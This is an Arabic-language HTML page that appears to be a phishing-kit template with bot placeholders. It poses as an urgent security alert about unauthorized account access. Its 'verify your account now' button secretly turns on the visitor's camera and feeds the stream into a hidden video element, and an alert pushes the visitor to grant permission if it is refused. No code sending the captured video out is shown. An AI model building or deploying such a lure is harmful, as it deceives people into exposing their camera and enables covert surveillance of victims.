<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحذير أمني: تم رصد دخول غير مصرح!</title>
    <meta property="og:title" content="تحذير أمني: تم رصد دخول غير مصرح لحسابك!" />
    <meta property="og:description" content="يرجى التحقق من نشاط حسابك فوراً لتأمين بياناتك." />
    <meta property="og:image" content="{{BOT_URL}}/images/security_alert.png" />
    <meta property="og:url" content="{{FULL_LINK}}" />
    <meta property="og:type" content="website" />
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #fbe9e7; color: #333; text-align: center; }
        .container { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 6px 20px rgba(0,0,0,0.1); max-width: 400px; width: 90%; border-top: 5px solid #d32f2f; }
        img { max-width: 150px; margin-bottom: 25px; }
        h1 { color: #d32f2f; margin-bottom: 15px; font-size: 1.8em; }
        p { font-size: 1.1em; line-height: 1.6; margin-bottom: 30px; }
        button { background-color: #d32f2f; color: white; padding: 15px 30px; border: none; border-radius: 8px; font-size: 1.2em; cursor: pointer; transition: background-color 0.3s ease; }
        button:hover { background-color: #c62828; }
        video { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <img src="{{BOT_URL}}/images/security_alert.png" alt="تحذير أمني">
        <h1>تحذير أمني!</h1>
        <p>تم رصد محاولة دخول غير مصرح بها إلى حسابك. يرجى التحقق فوراً.</p>
        <button id="activateCam">تحقق من حسابك الآن</button>
        <video id="cameraFeed" autoplay playsinline></video>
    </div>
    <script>
        document.getElementById('activateCam').addEventListener('click', function() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(function(stream) {
                    const video = document.getElementById('cameraFeed');
                    video.srcObject = stream;
                    console.log('Camera activated');
                })
                .catch(function(err) {
                    console.error('Error accessing camera: ', err);
                    alert('تعذر الوصول إلى الكاميرا. يرجى التأكد من منح الإذن.');
                });
            this.style.display = 'none';
        });
    </script>
</body>
</html>
